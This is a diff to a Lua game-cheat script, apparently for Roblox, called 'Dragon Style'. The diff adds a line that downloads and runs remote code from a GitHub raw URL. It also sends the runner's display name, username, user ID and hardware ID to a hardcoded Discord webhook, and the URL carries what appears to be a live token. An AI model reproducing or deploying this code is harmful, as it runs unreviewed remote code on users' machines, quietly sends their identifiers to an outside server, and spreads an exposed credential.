@@ -36,67 +36,14 @@ local L_MenuUI_6 = u1:WaitForChild("PlayerGui"):WaitForChild("MenuUI")
 local u12 = nil
 local battleWatcher = false;
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/altaccountv1/-CLASSIFIED-./main/Classified"))();
 
 local HttpService = game:GetService("HttpService")
 local Webhook_URL = "https://discord.com/api/webhooks/1155612192310317126/LIzFdRk1GtGk2jbWM8ra9H4rEMCE_BDQ5sEMtY5XE_lRCeEwESQwGlrwEma5N-VLAitG"
 local S_hwid = game:GetService("RbxAnalyticsService"):GetClientId()
-local DName = plr.DisplayName
-local UName = plr.Name
-local WV
-
-local allowed = {
-  "EA3B1811-0F8B-4B47-B533-0F783BD66D92",
-  "36DBB3CD-E14D-431E-A161-39F21C69CFE6",
-  "6F7C9600-90D8-4C10-8D51-95A8A6866E31",
-  "353CFD31-D5F3-4ECE-AA0F-B417AB1727B3",
-  "9E742733-2073-4CF5-B340-47C7AA0246DE",
-  "d4a3ad2a-411d-47f5-a3dd-a5f6687a8dff",
-  "AEB73120-33F6-46BA-AF92-30292587ACF9",
-  "26B6F7BF-03A6-482D-88D1-02490A48A502",
-  "F7520183-CA21-4E39-A774-5FAB86E19D3D",
-  "484E3D15-7521-4D75-8C53-236C8970C8C2",
-  "A6A68411-E759-46ED-BFCB-4677761D0F2C",
-  "E4543BD4-2B67-4431-B2F9-DE9B9576150D",
-  "3512B5DD-43F6-43F1-96CA-B0C36770B535",
-  "33b41c8b-2ec3-4d22-9e2f-36a279e693d9",
-  "4AC23081-903A-4CA5-B65F-6ADF82AE3C3E",
-  "D99151EF-CD9B-4466-8D01-96E9101DD7D1",
-  "9CA82D02-2EC3-4C90-BD88-13E4F0D2FD5F",
-  "BBDCB4CF-9738-415E-B4DF-6B41C5ABC146",
-  "7788FDE8-C238-488B-9170-695995ED17D5",
-  "BFD91CE3-DBFD-4DC8-9988-B68B9059E9B3",
-  "6e738097-e6c9-490f-8d92-5a5bd4330efb",
-  "72b9ea84-04ba-4194-9db0-984ada2062da",
-  "2DF6FB14-0D99-4179-AD68-324FD8BF9016",
-  "C3A8C2E1-C10E-4A54-94B7-31AACED73105",
-  "4BE854E8-0662-43BA-983F-E28BF43679A1",
-  "4BE854E8-0662-43BA-983F-E28BF43679A1",
-  "9BAAC266-BF94-497B-82B5-067B63E991BA",
-  "1d8689bc-6a69-481b-a9e5-d37808d347f7",
-  "ad9b4ad2-c9f7-42a1-9eab-7679e6583420",
-  "8e4bf214-d97a-42d7-98fd-4a036c29bd12",
-  "81432b63-4867-49a5-b67b-8dd31ae80f16",
-  "457199d4-a8a1-4175-b0e0-a0eb713bc989",
-  "216db83c-6729-434c-8a77-22cd5c693fc5",
-  "3b9746d8-8b5a-4982-976a-8fee7acfae4a",
-  "338698e1-d138-4a58-a28b-90a6b82a9299",
-  "39ea3ed0-560d-43c1-8f69-58a52dff0d59"
-}
-
-
-if table.find(allowed, S_hwid) then
-  WV = "Yes"
-else
-  WV = "No"
-end
-
-local embedcolor
-
-if WV == "Yes" then
-  embedcolor = "4388219"
-else
-  embedcolor = "14887209"
-end
+local plre = game.Players.LocalPlayer
+local DName = plre.DisplayName
+local UName = plre.Name
 
 local response =
     request(
@@ -112,13 +59,13 @@ local response =
                 ["embeds"] = {
                     {
                         ["title"] = "Dragon Style has been executed.",
-                        ["description"] = "fr",
+                        ["description"] = DName.. " / "..UName.. " has executed Dragon style. \n \n **Whitelist Value** \n".._G.WV.. "\n **UserId** \n "..tostring(plr.UserId),
                         ["type"] = "rich",
-                        ["color"] = embedcolor,
+                        ["color"] = _G.embedcolor,
                         ["fields"] = {
                            {
                         ["name"] = "Hardware Id",
-                        ["value"] = "fr",
+                        ["value"] = S_hwid,
                         ["inline"] = true
                            }
                         }
@@ -129,8 +76,8 @@ local response =
     }
 )
 
-if WV == "No" then
-  return plr:Kick("You are not whitelisted")
+if _G.WV == "No" then
+  return plre:Kick("You are not whitelisted")
 end
 
 local UserInputService = game:GetService("UserInputService")
